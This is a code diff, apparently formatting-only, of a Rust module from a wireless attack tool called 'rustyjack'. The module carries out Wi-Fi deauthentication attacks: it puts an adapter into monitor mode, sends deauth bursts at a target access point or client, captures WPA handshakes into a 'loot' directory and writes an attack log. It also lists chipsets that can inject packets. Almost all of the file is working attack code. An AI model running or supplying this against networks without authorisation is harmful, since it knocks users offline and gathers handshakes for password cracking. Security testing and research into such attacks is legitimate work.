@@ -3,18 +3,18 @@
 //! This module provides pure Rust implementations of wireless security operations
 //! using the `rustyjack-wireless` crate. No external tools (aircrack-ng, etc.) are used.
 
-use std::path::{Path, PathBuf};
-use anyhow::{Result, bail};
+use anyhow::{bail, Result};
 use serde_json::Value;
+use std::path::{Path, PathBuf};
 
-#[cfg(target_os = "linux")]
-use std::time::Duration;
-#[cfg(target_os = "linux")]
-use std::fs;
 #[cfg(target_os = "linux")]
 use anyhow::Context;
 #[cfg(target_os = "linux")]
 use chrono::Local;
+#[cfg(target_os = "linux")]
+use std::fs;
+#[cfg(target_os = "linux")]
+use std::time::Duration;
 
 /// Result of a deauthentication attack
 #[derive(Debug, Clone)]
@@ -89,11 +89,13 @@ pub fn execute_deauth_attack(
     on_progress: impl Fn(f32, &str),
 ) -> Result<DeauthResult> {
     use rustyjack_wireless::{
-        WirelessInterface, DeauthAttacker,
-        DeauthConfig as NativeDeauthConfig, DeauthReason,
+        DeauthAttacker, DeauthConfig as NativeDeauthConfig, DeauthReason, WirelessInterface,
     };
 
-    log::info!("Starting native Rust deauth attack on BSSID: {}", config.bssid);
+    log::info!(
+        "Starting native Rust deauth attack on BSSID: {}",
+        config.bssid
+    );
     on_progress(0.02, "Validating configuration...");
 
     // Validate interface is wireless
@@ -102,8 +104,8 @@ pub fn execute_deauth_attack(
     }
 
     // Parse BSSID
-    let bssid: rustyjack_wireless::MacAddress = config.bssid.parse()
-        .context("Invalid BSSID format")?;
+    let bssid: rustyjack_wireless::MacAddress =
+        config.bssid.parse().context("Invalid BSSID format")?;
 
     // Parse optional client MAC
     let client: Option<rustyjack_wireless::MacAddress> = if let Some(ref c) = config.client {
@@ -115,7 +117,8 @@ pub fn execute_deauth_attack(
     // Generate output filenames with timestamp
     let timestamp = Local::now().format("%Y%m%d_%H%M%S");
     let ssid_display = config.ssid.clone().unwrap_or_else(|| config.bssid.clone());
-    let safe_ssid = ssid_display.replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
+    let safe_ssid =
+        ssid_display.replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
     let log_file = loot_dir.join(format!("deauth_{}_{}.txt", safe_ssid, timestamp));
     let capture_file = loot_dir.join(format!("{}_{}.pcap", safe_ssid, timestamp));
 
@@ -126,15 +129,17 @@ pub fn execute_deauth_attack(
     on_progress(0.05, "Initializing wireless interface...");
 
     // Setup interface in monitor mode
-    let mut iface = WirelessInterface::new(&config.interface)
-        .context("Failed to open wireless interface")?;
+    let mut iface =
+        WirelessInterface::new(&config.interface).context("Failed to open wireless interface")?;
 
     on_progress(0.10, "Enabling monitor mode...");
-    iface.set_monitor_mode()
-        .context("Failed to enable monitor mode. Ensure adapter supports monitor mode and injection.")?;
+    iface.set_monitor_mode().context(
+        "Failed to enable monitor mode. Ensure adapter supports monitor mode and injection.",
+    )?;
 
     on_progress(0.15, &format!("Setting channel {}...", config.channel));
-    iface.set_channel(config.channel)
+    iface
+        .set_channel(config.channel)
         .context("Failed to set channel")?;
 
     // Create native deauth config
@@ -152,10 +157,10 @@ pub fn execute_deauth_attack(
     on_progress(0.20, "Starting deauth attack with capture...");
 
     // Create attacker and execute with capture
-    let mut attacker = DeauthAttacker::new(&iface)
-        .context("Failed to create deauth attacker")?;
+    let mut attacker = DeauthAttacker::new(&iface).context("Failed to create deauth attacker")?;
 
-    let (stats, captured_packets) = attacker.attack_with_capture(bssid, client, native_config)
+    let (stats, captured_packets) = attacker
+        .attack_with_capture(bssid, client, native_config)
         .context("Deauth attack failed")?;
 
     on_progress(0.90, "Saving capture data...");
@@ -187,7 +192,10 @@ pub fn execute_deauth_attack(
     log_content.push_str("====================================================\n");
     log_content.push_str("    RUSTYJACK NATIVE DEAUTHENTICATION ATTACK LOG   \n");
     log_content.push_str("====================================================\n\n");
-    log_content.push_str(&format!("Timestamp: {}\n", Local::now().format("%Y-%m-%d %H:%M:%S")));
+    log_content.push_str(&format!(
+        "Timestamp: {}\n",
+        Local::now().format("%Y-%m-%d %H:%M:%S")
+    ));
     log_content.push_str("Implementation: Native Rust (rustyjack-wireless)\n\n");
     log_content.push_str("--- TARGET INFORMATION ----------------------------\n");
     log_content.push_str(&format!("Target BSSID: {}\n", config.bssid));
@@ -205,17 +213,30 @@ pub fn execute_deauth_attack(
     log_content.push_str(&format!("Burst interval: {} seconds\n", config.interval));
     log_content.push_str(&format!("Continuous mode: {}\n", config.continuous));
     log_content.push_str("\n--- ATTACK RESULTS --------------------------------\n");
-    log_content.push_str(&format!("Attack Duration: {:.1} seconds\n", stats.duration.as_secs_f32()));
+    log_content.push_str(&format!(
+        "Attack Duration: {:.1} seconds\n",
+        stats.duration.as_secs_f32()
+    ));
     log_content.push_str(&format!("Total bursts: {}\n", stats.bursts));
     log_content.push_str(&format!("Total packets sent: {}\n", stats.packets_sent));
     log_content.push_str(&format!("Failed packets: {}\n", stats.failed_packets));
     log_content.push_str(&format!("Bytes sent: {}\n", stats.bytes_sent));
-    log_content.push_str(&format!("Packets/second: {:.1}\n", stats.packets_per_second()));
+    log_content.push_str(&format!(
+        "Packets/second: {:.1}\n",
+        stats.packets_per_second()
+    ));
     log_content.push_str(&format!("EAPOL frames captured: {}\n", stats.eapol_frames));
     log_content.push_str("\n====================================================\n");
-    log_content.push_str(&format!("HANDSHAKE CAPTURED: {}\n", if stats.handshake_captured { "YES" } else { "NO" }));
+    log_content.push_str(&format!(
+        "HANDSHAKE CAPTURED: {}\n",
+        if stats.handshake_captured {
+            "YES"
+        } else {
+            "NO"
+        }
+    ));
     log_content.push_str("====================================================\n\n");
-    
+
     if !capture_files.is_empty() {
         log_content.push_str("Capture files:\n");
         for file in &capture_files {
@@ -236,7 +257,11 @@ pub fn execute_deauth_attack(
         bursts: stats.bursts,
         duration_secs: stats.duration.as_secs(),
         handshake_captured: stats.handshake_captured,
-        handshake_file: if stats.handshake_captured { capture_files.first().cloned() } else { None },
+        handshake_file: if stats.handshake_captured {
+            capture_files.first().cloned()
+        } else {
+            None
+        },
         capture_files,
         log_file,
         eapol_frames: stats.eapol_frames,
@@ -265,8 +290,8 @@ pub struct WirelessCapabilities {
 
 impl WirelessCapabilities {
     pub fn is_attack_capable(&self) -> bool {
-        self.native_available 
-            && self.has_root 
+        self.native_available
+            && self.has_root
             && self.interface_is_wireless
             && self.supports_monitor_mode
     }
@@ -278,7 +303,7 @@ pub fn check_capabilities(interface: &str) -> WirelessCapabilities {
     let has_root = unsafe { libc::geteuid() == 0 };
     let interface_exists = std::path::Path::new(&format!("/sys/class/net/{}", interface)).exists();
     let interface_is_wireless = is_wireless_interface(interface);
-    
+
     // Check monitor mode support via iw
     let supports_monitor = std::process::Command::new("iw")
         .args(["phy", "phy0", "info"])
@@ -310,17 +335,17 @@ pub fn check_capabilities(_interface: &str) -> WirelessCapabilities {
 
 /// Known injection-capable chipsets
 pub const INJECTION_CAPABLE_CHIPSETS: &[&str] = &[
-    "AR9271",      // Atheros - most compatible
-    "AR9287",      // Atheros
-    "RTL8187",     // Realtek - older but works
-    "RTL8812AU",   // Realtek - 5GHz support
-    "RTL8814AU",   // Realtek - high power
-    "RT3070",      // Ralink
-    "RT3572",      // Ralink - dual band
-    "RT5370",      // Ralink
-    "RT5572",      // Ralink - dual band
-    "MT7612U",     // Mediatek - good 5GHz
-    "MT7610U",     // Mediatek
+    "AR9271",    // Atheros - most compatible
+    "AR9287",    // Atheros
+    "RTL8187",   // Realtek - older but works
+    "RTL8812AU", // Realtek - 5GHz support
+    "RTL8814AU", // Realtek - high power
+    "RT3070",    // Ralink
+    "RT3572",    // Ralink - dual band
+    "RT5370",    // Ralink
+    "RT5572",    // Ralink - dual band
+    "MT7612U",   // Mediatek - good 5GHz
+    "MT7610U",   // Mediatek
 ];
 
 /// Recommended adapters for purchase
